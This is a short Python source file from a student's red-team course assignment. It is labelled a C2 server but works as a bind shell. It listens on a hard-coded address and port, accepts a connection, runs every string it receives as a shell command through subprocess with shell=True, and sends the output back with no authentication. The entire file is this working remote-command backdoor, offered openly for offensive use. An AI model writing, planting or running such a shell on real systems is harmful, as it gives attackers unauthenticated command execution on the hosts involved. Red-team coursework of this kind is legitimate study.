##########################################################################
#Name: Nicholas Milonni
#Date: 9/20/2024
#Course: CSEC 473
#Semester: Fall 2024

#This file contains a C2 Server. It is mean to be used
#in a red team role. It goes hand and hand with the client file.
##########################################################################

import socket
import subprocess

'''This function starts the C2 server.
'''
def server(host, port):
    print("Starting The C2 Server.")
    new_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    new_connection.bind((host, int(port)))
    new_connection.listen(int(port)) #listening for any messages from the client side.

    connected = True
    connection, address = new_connection.accept() #accepting the connection.
    while connected:
        command = connection.recv(1024).decode()
        result = recieve_commands(command) #calling the function to run the commands from the client.
        connection.send(result) #returning the output to the client.

'''This function allows for commands to be run on the server, and for
    the output of these commands to be returned to the client.
'''
def recieve_commands(sent_cmd):
    run_command = subprocess.run([sent_cmd], stdout = subprocess.PIPE, shell = True)
    print(str(run_command.stdout))
    return run_command.stdout #returning output, to be sent to the client.

'''This function allows for the server
   function to be called.
'''
def main():
    host = "100.65.3.0"
    port = 47
    server(host, port) #Calling the server to start.

main()
